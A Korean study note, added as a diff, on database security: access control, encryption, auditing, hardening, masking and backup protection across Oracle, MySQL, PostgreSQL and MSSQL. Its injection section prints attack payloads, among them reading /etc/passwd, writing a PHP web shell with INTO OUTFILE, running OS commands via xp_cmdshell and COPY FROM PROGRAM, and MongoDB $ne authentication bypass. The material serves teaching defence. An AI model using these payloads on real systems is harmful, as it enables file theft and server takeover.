@@ -1,0 +1,712 @@
+# 데이터베이스 보안
+
+데이터베이스 시스템의 보안 위협과 보호 기술에 대해 학습합니다.
+
+---
+
+## 데이터베이스 개요
+
+### DBMS 유형
+
+| 유형 | 설명 | 예시 |
+|------|------|------|
+| 관계형 (RDBMS) | 테이블 기반, SQL 사용 | Oracle, MySQL, PostgreSQL, MSSQL |
+| NoSQL | 비정형 데이터, 유연한 스키마 | MongoDB, Redis, Cassandra |
+| 인메모리 | 메모리 기반 고속 처리 | Redis, Memcached |
+| 시계열 | 시간 기반 데이터 | InfluxDB, TimescaleDB |
+
+### 데이터베이스 구성요소
+
+| 구성요소 | 설명 |
+|---------|------|
+| 스키마 | 데이터베이스 구조 정의 |
+| 테이블 | 데이터 저장 단위 |
+| 뷰 | 가상 테이블 |
+| 인덱스 | 검색 성능 향상 |
+| 저장 프로시저 | 미리 컴파일된 SQL |
+| 트리거 | 자동 실행 로직 |
+
+---
+
+## 데이터베이스 보안 위협
+
+### 주요 위협
+
+| 위협 | 설명 |
+|------|------|
+| SQL Injection | SQL 쿼리 조작 |
+| 권한 상승 | 비인가 권한 획득 |
+| 데이터 유출 | 민감 정보 노출 |
+| 데이터 변조 | 무단 데이터 수정 |
+| 서비스 거부 | DB 리소스 고갈 |
+| 백업 탈취 | 백업 파일 유출 |
+| 내부자 위협 | 권한 있는 사용자의 악용 |
+
+### 공격 경로
+
+| 경로 | 설명 |
+|------|------|
+| 애플리케이션 | 웹 앱 취약점을 통한 공격 |
+| 네트워크 | DB 포트 직접 접근 |
+| 관리 도구 | 관리 인터페이스 악용 |
+| 백업/로그 | 백업 파일, 로그 파일 접근 |
+| 물리적 접근 | 서버 물리적 접근 |
+
+---
+
+## 데이터베이스 접근 제어
+
+### 인증 (Authentication)
+
+| 방식 | 설명 |
+|------|------|
+| 데이터베이스 인증 | DB 자체 계정/패스워드 |
+| OS 인증 | 운영체제 계정 연동 |
+| 외부 인증 | LDAP, Kerberos, RADIUS |
+| 다중 인증 | MFA 적용 |
+
+### 권한 부여 (Authorization)
+
+#### 권한 유형
+
+| 권한 | 설명 |
+|------|------|
+| SELECT | 데이터 조회 |
+| INSERT | 데이터 삽입 |
+| UPDATE | 데이터 수정 |
+| DELETE | 데이터 삭제 |
+| CREATE | 객체 생성 |
+| DROP | 객체 삭제 |
+| ALTER | 객체 수정 |
+| EXECUTE | 프로시저 실행 |
+| GRANT | 권한 부여 |
+
+#### DCL (Data Control Language)
+
+```sql
+-- 권한 부여
+GRANT SELECT, INSERT ON employees TO user1;
+
+-- 모든 권한 부여
+GRANT ALL PRIVILEGES ON database.* TO user1;
+
+-- 권한 회수
+REVOKE INSERT ON employees FROM user1;
+
+-- 역할 생성 및 부여
+CREATE ROLE readonly;
+GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly;
+GRANT readonly TO user1;
+```
+
+### 최소 권한 원칙
+
+| 원칙 | 설명 |
+|------|------|
+| 필요한 권한만 | 업무에 필요한 최소 권한 |
+| 역할 기반 | RBAC로 권한 관리 |
+| 정기 검토 | 권한 주기적 재검토 |
+| 분리 | 개발/운영/DBA 권한 분리 |
+
+### 행 수준 보안 (Row-Level Security)
+
+```sql
+-- PostgreSQL RLS
+ALTER TABLE employees ENABLE ROW LEVEL SECURITY;
+
+CREATE POLICY emp_policy ON employees
+    FOR SELECT
+    USING (department_id = current_setting('app.department_id')::int);
+```
+
+### 열 수준 보안 (Column-Level Security)
+
+```sql
+-- 특정 열에만 권한 부여
+GRANT SELECT (id, name, department) ON employees TO user1;
+-- salary 열 접근 불가
+```
+
+---
+
+## 데이터 암호화
+
+### 암호화 유형
+
+| 유형 | 설명 | 적용 |
+|------|------|------|
+| 저장 데이터 암호화 (At-Rest) | 저장된 데이터 암호화 | 디스크, 백업 |
+| 전송 데이터 암호화 (In-Transit) | 네트워크 전송 중 암호화 | TLS/SSL |
+| 사용 중 암호화 (In-Use) | 메모리 내 데이터 암호화 | SGX, 동형암호 |
+
+### TDE (Transparent Data Encryption)
+
+| 항목 | 설명 |
+|------|------|
+| 정의 | 데이터베이스 수준 자동 암호화 |
+| 동작 | 저장 시 암호화, 읽기 시 복호화 |
+| 장점 | 애플리케이션 변경 불필요 |
+| 지원 | Oracle, MSSQL, MySQL |
+
+**Oracle TDE 설정**
+
+```sql
+-- 지갑 생성
+ALTER SYSTEM SET ENCRYPTION KEY IDENTIFIED BY "wallet_password";
+
+-- 테이블스페이스 암호화
+CREATE TABLESPACE secure_ts
+    DATAFILE '/path/secure01.dbf' SIZE 100M
+    ENCRYPTION USING 'AES256'
+    DEFAULT STORAGE (ENCRYPT);
+
+-- 테이블 암호화
+ALTER TABLE employees ENCRYPT;
+```
+
+**MSSQL TDE 설정**
+
+```sql
+-- 마스터 키 생성
+CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'strong_password';
+
+-- 인증서 생성
+CREATE CERTIFICATE TDECert WITH SUBJECT = 'TDE Certificate';
+
+-- 데이터베이스 암호화 키 생성
+USE target_database;
+CREATE DATABASE ENCRYPTION KEY
+    WITH ALGORITHM = AES_256
+    ENCRYPTION BY SERVER CERTIFICATE TDECert;
+
+-- TDE 활성화
+ALTER DATABASE target_database SET ENCRYPTION ON;
+```
+
+### 컬럼 레벨 암호화
+
+```sql
+-- 암호화 함수 사용
+INSERT INTO users (username, password, ssn)
+VALUES ('user1', SHA2('password', 256), AES_ENCRYPT('123-45-6789', 'secret_key'));
+
+-- 복호화
+SELECT username, AES_DECRYPT(ssn, 'secret_key') AS ssn FROM users;
+```
+
+### 키 관리
+
+| 요소 | 설명 |
+|------|------|
+| 키 생성 | 안전한 난수 생성 |
+| 키 저장 | HSM, 키 관리 시스템 |
+| 키 순환 | 정기적 키 변경 |
+| 키 백업 | 안전한 키 백업 |
+| 키 폐기 | 안전한 키 삭제 |
+
+---
+
+## 데이터베이스 감사
+
+### 감사 유형
+
+| 유형 | 설명 |
+|------|------|
+| 문장 감사 | SQL 문장 유형별 기록 |
+| 권한 감사 | 권한 사용 기록 |
+| 객체 감사 | 특정 객체 접근 기록 |
+| 세분화 감사 | 조건부 상세 감사 |
+
+### 감사 대상
+
+| 대상 | 설명 |
+|------|------|
+| 로그인/로그아웃 | 접속 시도, 성공, 실패 |
+| DDL | CREATE, ALTER, DROP |
+| DML | SELECT, INSERT, UPDATE, DELETE |
+| DCL | GRANT, REVOKE |
+| 권한 변경 | 계정, 역할 변경 |
+| 설정 변경 | 시스템 설정 변경 |
+
+### Oracle 감사
+
+```sql
+-- 감사 활성화
+ALTER SYSTEM SET audit_trail = DB SCOPE = SPFILE;
+
+-- 문장 감사
+AUDIT SELECT TABLE, INSERT TABLE, UPDATE TABLE, DELETE TABLE;
+
+-- 권한 감사
+AUDIT CREATE USER, ALTER USER, DROP USER;
+
+-- 객체 감사
+AUDIT SELECT ON hr.employees BY ACCESS;
+
+-- 감사 로그 조회
+SELECT * FROM DBA_AUDIT_TRAIL;
+
+-- 통합 감사 (12c+)
+CREATE AUDIT POLICY sensitive_data_policy
+    ACTIONS SELECT ON hr.employees;
+AUDIT POLICY sensitive_data_policy;
+```
+
+### MySQL 감사
+
+```sql
+-- 일반 쿼리 로그
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = '/var/log/mysql/query.log';
+
+-- 감사 플러그인 (Enterprise)
+INSTALL PLUGIN audit_log SONAME 'audit_log.so';
+SET GLOBAL audit_log_policy = 'ALL';
+```
+
+### PostgreSQL 감사
+
+```sql
+-- postgresql.conf
+log_statement = 'all'
+log_connections = on
+log_disconnections = on
+
+-- pgAudit 확장
+CREATE EXTENSION pgaudit;
+ALTER SYSTEM SET pgaudit.log = 'read, write, ddl';
+```
+
+### MSSQL 감사
+
+```sql
+-- 서버 감사 생성
+CREATE SERVER AUDIT MainAudit
+    TO FILE (FILEPATH = 'C:\AuditLogs\');
+
+-- 데이터베이스 감사 사양
+CREATE DATABASE AUDIT SPECIFICATION DBAudit
+    FOR SERVER AUDIT MainAudit
+    ADD (SELECT, INSERT, UPDATE, DELETE ON SCHEMA::dbo BY public);
+
+-- 감사 활성화
+ALTER SERVER AUDIT MainAudit WITH (STATE = ON);
+ALTER DATABASE AUDIT SPECIFICATION DBAudit WITH (STATE = ON);
+```
+
+---
+
+## 데이터베이스 보안 설정
+
+### 계정 관리
+
+| 항목 | 권장 설정 |
+|------|----------|
+| 기본 계정 | 비활성화 또는 패스워드 변경 |
+| 불필요한 계정 | 삭제 |
+| 공유 계정 | 사용 금지 |
+| 서비스 계정 | 최소 권한, 강력한 패스워드 |
+| 패스워드 정책 | 복잡도, 만료, 재사용 금지 |
+| 계정 잠금 | 실패 시 잠금 |
+
+### 네트워크 보안
+
+| 항목 | 권장 설정 |
+|------|----------|
+| 리스닝 주소 | 필요한 인터페이스만 |
+| 포트 | 기본 포트 변경 고려 |
+| 방화벽 | DB 포트 접근 제한 |
+| 암호화 | TLS/SSL 강제 |
+| 원격 접속 | 필요시에만 허용 |
+
+**MySQL 네트워크 설정**
+
+```ini
+# my.cnf
+[mysqld]
+bind-address = 192.168.1.100
+skip-networking = 0
+require_secure_transport = ON
+```
+
+**PostgreSQL 네트워크 설정**
+
+```
+# postgresql.conf
+listen_addresses = '192.168.1.100'
+ssl = on
+ssl_cert_file = 'server.crt'
+ssl_key_file = 'server.key'
+
+# pg_hba.conf
+hostssl all all 192.168.1.0/24 scram-sha-256
+```
+
+### 기본 계정 보안
+
+| DBMS | 기본 계정 | 조치 |
+|------|----------|------|
+| Oracle | SYS, SYSTEM, SCOTT | 패스워드 변경, SCOTT 잠금 |
+| MySQL | root, anonymous | root 원격 접속 금지, anonymous 삭제 |
+| PostgreSQL | postgres | 패스워드 설정, 원격 접속 제한 |
+| MSSQL | sa | 비활성화 또는 강력한 패스워드 |
+
+**MySQL 보안 설정**
+
+```sql
+-- anonymous 사용자 삭제
+DELETE FROM mysql.user WHERE User = '';
+
+-- root 원격 접속 제한
+DELETE FROM mysql.user WHERE User = 'root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
+
+-- 테스트 데이터베이스 삭제
+DROP DATABASE IF EXISTS test;
+
+-- 권한 적용
+FLUSH PRIVILEGES;
+
+-- mysql_secure_installation 스크립트 사용 권장
+```
+
+---
+
+## SQL Injection 심화
+
+### 데이터베이스별 특수 구문
+
+#### Oracle
+
+```sql
+-- 주석
+SELECT * FROM users WHERE id = 1 --
+SELECT * FROM users WHERE id = 1 /* comment */
+
+-- 문자열 연결
+SELECT 'a' || 'b' FROM dual;
+
+-- 서브쿼리
+SELECT * FROM (SELECT username FROM all_users);
+
+-- 메타데이터
+SELECT table_name FROM all_tables;
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
+```
+
+#### MySQL
+
+```sql
+-- 주석
+SELECT * FROM users WHERE id = 1 -- (공백 필요)
+SELECT * FROM users WHERE id = 1 #
+SELECT * FROM users WHERE id = 1 /* comment */
+
+-- 문자열 연결
+SELECT CONCAT('a', 'b');
+
+-- 메타데이터
+SELECT table_name FROM information_schema.tables;
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+
+-- 파일 읽기/쓰기
+SELECT LOAD_FILE('/etc/passwd');
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php';
+```
+
+#### MSSQL
+
+```sql
+-- 주석
+SELECT * FROM users WHERE id = 1 --
+SELECT * FROM users WHERE id = 1 /* comment */
+
+-- 문자열 연결
+SELECT 'a' + 'b';
+
+-- 메타데이터
+SELECT name FROM sysobjects WHERE xtype = 'U';
+SELECT name FROM syscolumns WHERE id = OBJECT_ID('users');
+
+-- 명령 실행
+EXEC xp_cmdshell 'whoami';
+```
+
+#### PostgreSQL
+
+```sql
+-- 주석
+SELECT * FROM users WHERE id = 1 --
+SELECT * FROM users WHERE id = 1 /* comment */
+
+-- 문자열 연결
+SELECT 'a' || 'b';
+
+-- 메타데이터
+SELECT table_name FROM information_schema.tables;
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+
+-- 파일 읽기
+SELECT pg_read_file('/etc/passwd');
+
+-- 명령 실행 (슈퍼유저)
+COPY cmd_output FROM PROGRAM 'whoami';
+```
+
+### 이차 SQL Injection
+
+| 항목 | 설명 |
+|------|------|
+| 정의 | 저장된 데이터가 나중에 SQL에 사용될 때 발생 |
+| 예시 | 사용자명에 페이로드 저장 → 다른 쿼리에서 실행 |
+| 탐지 | 일반 스캐너로 탐지 어려움 |
+
+```sql
+-- 1단계: 페이로드 저장
+INSERT INTO users (username) VALUES ('admin''--');
+
+-- 2단계: 저장된 값이 다른 쿼리에 사용
+SELECT * FROM logs WHERE username = 'admin'--';
+```
+
+---
+
+## NoSQL Injection
+
+### MongoDB Injection
+
+| 항목 | 설명 |
+|------|------|
+| 원리 | JSON/BSON 쿼리 조작 |
+| 연산자 | $ne, $gt, $regex 등 악용 |
+
+**인증 우회**
+
+```javascript
+// 정상 쿼리
+db.users.find({ username: "admin", password: "password" });
+
+// 공격 (password가 빈 문자열이 아닌 경우)
+// URL: ?username=admin&password[$ne]=
+db.users.find({ username: "admin", password: { $ne: "" } });
+
+// 정규식 공격
+db.users.find({ username: "admin", password: { $regex: ".*" } });
+```
+
+### NoSQL Injection 대응
+
+| 대응 | 설명 |
+|------|------|
+| 입력 검증 | 타입 검증, 연산자 필터링 |
+| 파라미터화 | 쿼리 파라미터 분리 |
+| ODM 사용 | Mongoose 등 ODM 활용 |
+| 권한 제한 | 최소 권한 원칙 |
+
+---
+
+## 데이터 마스킹
+
+### 마스킹 유형
+
+| 유형 | 설명 | 예시 |
+|------|------|------|
+| 정적 마스킹 | 비운영 환경 데이터 변환 | 개발/테스트 DB |
+| 동적 마스킹 | 조회 시 실시간 마스킹 | 운영 환경 |
+
+### 마스킹 기법
+
+| 기법 | 설명 | 예시 |
+|------|------|------|
+| 치환 | 다른 값으로 대체 | 홍길동 → 김*수 |
+| 부분 가림 | 일부만 표시 | 1234-5678 → 1234-**** |
+| 셔플 | 순서 섞기 | 레코드 간 값 교환 |
+| 널 처리 | NULL로 대체 | 민감 컬럼 NULL |
+| 암호화 | 암호화된 값 표시 | AES 암호문 |
+| 토큰화 | 토큰으로 대체 | 카드번호 → 토큰 |
+
+### 동적 마스킹 예시
+
+**Oracle Data Redaction**
+
+```sql
+-- 마스킹 정책 생성
+BEGIN
+    DBMS_REDACT.ADD_POLICY(
+        object_schema => 'HR',
+        object_name => 'EMPLOYEES',
+        column_name => 'SALARY',
+        policy_name => 'mask_salary',
+        function_type => DBMS_REDACT.FULL,
+        expression => 'SYS_CONTEXT(''USERENV'', ''SESSION_USER'') != ''HR_ADMIN'''
+    );
+END;
+```
+
+**MSSQL Dynamic Data Masking**
+
+```sql
+-- 테이블 생성 시 마스킹
+CREATE TABLE Customers (
+    ID int PRIMARY KEY,
+    Name varchar(100),
+    Email varchar(100) MASKED WITH (FUNCTION = 'email()'),
+    SSN char(11) MASKED WITH (FUNCTION = 'partial(0,"XXX-XX-",4)'),
+    Phone varchar(20) MASKED WITH (FUNCTION = 'default()')
+);
+
+-- 기존 컬럼에 마스킹 추가
+ALTER TABLE Customers
+ALTER COLUMN Phone ADD MASKED WITH (FUNCTION = 'default()');
+```
+
+---
+
+## 데이터베이스 백업 보안
+
+### 백업 보안 위협
+
+| 위협 | 설명 |
+|------|------|
+| 백업 파일 탈취 | 암호화되지 않은 백업 유출 |
+| 불완전한 삭제 | 오래된 백업 미삭제 |
+| 무단 복구 | 비인가된 환경에서 복구 |
+| 전송 중 노출 | 네트워크 전송 시 도청 |
+
+### 백업 보안 대책
+
+| 대책 | 설명 |
+|------|------|
+| 백업 암호화 | 백업 파일 암호화 |
+| 접근 제어 | 백업 파일 접근 제한 |
+| 안전한 저장소 | 물리적/논리적 분리 |
+| 보존 정책 | 보존 기간 후 안전한 삭제 |
+| 전송 암호화 | 네트워크 전송 시 암호화 |
+| 복구 테스트 | 정기적 복구 테스트 |
+
+**암호화된 백업**
+
+```bash
+# MySQL
+mysqldump --all-databases | openssl enc -aes-256-cbc -salt -out backup.sql.enc
+
+# PostgreSQL
+pg_dump dbname | gpg -c -o backup.sql.gpg
+
+# Oracle RMAN
+CONFIGURE ENCRYPTION FOR DATABASE ON;
+BACKUP DATABASE;
+```
+
+---
+
+## 데이터베이스 보안 솔루션
+
+### DAM (Database Activity Monitoring)
+
+| 기능 | 설명 |
+|------|------|
+| 모니터링 | 모든 DB 활동 실시간 감시 |
+| 감사 | 상세 감사 로그 생성 |
+| 경고 | 의심 활동 실시간 알림 |
+| 분석 | 사용자 행위 분석 |
+| 리포팅 | 컴플라이언스 보고서 |
+
+### DBF (Database Firewall)
+
+| 기능 | 설명 |
+|------|------|
+| SQL 분석 | SQL 문장 실시간 분석 |
+| 차단 | 악성 쿼리 차단 |
+| 정책 적용 | 접근 정책 강제 |
+| 가상 패치 | 취약점 가상 패치 |
+
+### 주요 솔루션
+
+| 솔루션 | 벤더 | 유형 |
+|--------|------|------|
+| Oracle Audit Vault | Oracle | DAM |
+| IBM Guardium | IBM | DAM/DBF |
+| Imperva SecureSphere | Imperva | DBF |
+| McAfee Database Security | McAfee | DAM |
+
+---
+
+## 데이터베이스 취약점 점검
+
+### 점검 항목
+
+| 항목 | 설명 |
+|------|------|
+| 계정 관리 | 기본 계정, 불필요 계정, 패스워드 정책 |
+| 권한 관리 | 과도한 권한, 공용 권한 |
+| 네트워크 | 리스닝 설정, 암호화 |
+| 패치 | 최신 패치 적용 |
+| 감사 | 감사 설정 활성화 |
+| 암호화 | 민감 데이터 암호화 |
+
+### 취약점 스캐너
+
+| 도구 | 설명 |
+|------|------|
+| DbProtect | 데이터베이스 취약점 스캐너 |
+| AppDetectivePro | DB 보안 평가 도구 |
+| Nessus | DB 플러그인 포함 |
+| SQLMap | SQL Injection 스캐너 |
+
+### KISA 점검 가이드
+
+| 구분 | 점검 항목 |
+|------|----------|
+| D-01 | 기본 계정의 패스워드, 정책 등을 변경하여 사용 |
+| D-02 | Scott 등 Demonstration 계정 제거 |
+| D-03 | 패스워드 복잡도 설정 |
+| D-04 | 패스워드 최대 사용 기간 설정 |
+| D-05 | 패스워드 최소 사용 기간 설정 |
+| D-06 | 패스워드 재사용 제한 |
+| D-07 | 로그인 실패 잠금 설정 |
+| D-08 | 원격 접속 제한 |
+| D-09 | DBA 권한 최소화 |
+| D-10 | Public 권한 제한 |
+
+---
+
+## 용어 해설
+
+| 용어 | 설명 |
+|------|------|
+| RDBMS (Relational DBMS) | 관계형 데이터베이스 관리 시스템. 테이블 형태로 데이터 저장, SQL 사용. Oracle, MySQL, PostgreSQL 등 |
+| NoSQL | 비관계형 데이터베이스. 유연한 스키마, 수평 확장에 유리. MongoDB, Redis, Cassandra 등 |
+| 스키마 (Schema) | 데이터베이스의 구조와 제약조건을 정의한 것. 테이블, 열, 관계 등의 구조 |
+| 뷰 (View) | 하나 이상의 테이블에서 유도된 가상 테이블. 접근 제어와 데이터 추상화에 활용 |
+| 저장 프로시저 (Stored Procedure) | 데이터베이스에 저장된 미리 컴파일된 SQL 문장 집합. 보안과 성능에 유리 |
+| 트리거 (Trigger) | 특정 이벤트(INSERT, UPDATE, DELETE) 발생 시 자동 실행되는 프로시저 |
+| DCL (Data Control Language) | 데이터 접근 권한을 제어하는 SQL. GRANT, REVOKE 명령 |
+| GRANT | 사용자에게 데이터베이스 객체에 대한 권한을 부여하는 명령 |
+| REVOKE | 사용자로부터 이전에 부여된 권한을 회수하는 명령 |
+| RBAC (Role-Based Access Control) | 역할 기반 접근 제어. 사용자에게 역할을 부여하고 역할에 권한 할당 |
+| 행 수준 보안 (RLS) | Row-Level Security. 사용자별로 조회 가능한 행을 제한하는 보안 기능 |
+| 열 수준 보안 | 특정 열에 대한 접근을 사용자별로 제한하는 보안 기능 |
+| TDE (Transparent Data Encryption) | 데이터베이스 수준에서 자동으로 저장 데이터를 암호화하는 기술. 애플리케이션 수정 불필요 |
+| 저장 데이터 암호화 (At-Rest) | 디스크에 저장된 데이터의 암호화. TDE, 컬럼 암호화 등 |
+| 전송 데이터 암호화 (In-Transit) | 네트워크를 통해 전송되는 데이터의 암호화. TLS/SSL 사용 |
+| HSM (Hardware Security Module) | 암호화 키를 안전하게 저장하고 암호화 연산을 수행하는 전용 하드웨어 |
+| 감사 (Audit) | 데이터베이스 활동을 기록하고 모니터링하는 기능. 보안 사고 탐지 및 포렌식에 활용 |
+| 문장 감사 (Statement Audit) | SQL 문장 유형별로 실행을 기록하는 감사 방식 |
+| 객체 감사 (Object Audit) | 특정 테이블, 뷰 등 객체에 대한 접근을 기록하는 감사 방식 |
+| 이차 SQL Injection | 저장된 데이터가 나중에 다른 SQL 쿼리에서 사용될 때 발생하는 SQL Injection |
+| MongoDB Injection | MongoDB의 쿼리 연산자($ne, $gt 등)를 악용하는 NoSQL Injection |
+| 정적 마스킹 | 비운영 환경(개발/테스트)을 위해 데이터를 영구적으로 변환하는 마스킹 |
+| 동적 마스킹 | 조회 시점에 실시간으로 민감 데이터를 가리는 마스킹. 원본 데이터 유지 |
+| 토큰화 (Tokenization) | 민감 데이터를 의미 없는 토큰으로 대체하는 기법. 카드번호 보호에 주로 사용 |
+| DAM (Database Activity Monitoring) | 데이터베이스 활동을 실시간으로 모니터링하고 감사하는 솔루션 |
+| DBF (Database Firewall) | 데이터베이스로 들어오는 SQL을 분석하여 악성 쿼리를 차단하는 솔루션 |
+| xp_cmdshell | MSSQL의 확장 저장 프로시저. OS 명령 실행 가능하여 SQL Injection에서 악용 |
+| information_schema | MySQL, PostgreSQL의 메타데이터 스키마. SQL Injection에서 테이블/컬럼 정보 획득에 사용 |
+| LOAD_FILE | MySQL에서 파일을 읽는 함수. SQL Injection에서 시스템 파일 읽기에 악용 |
+| INTO OUTFILE | MySQL에서 쿼리 결과를 파일로 저장하는 구문. 웹쉘 생성에 악용 가능 |
+
+---
+
+## 핵심 키워드
+
+`DBMS` `접근 제어` `GRANT` `REVOKE` `최소 권한` `TDE` `컬럼 암호화` `감사` `계정 관리` `SQL Injection` `NoSQL Injection` `데이터 마스킹` `동적 마스킹` `백업 암호화` `DAM` `DBF` `취약점 점검`
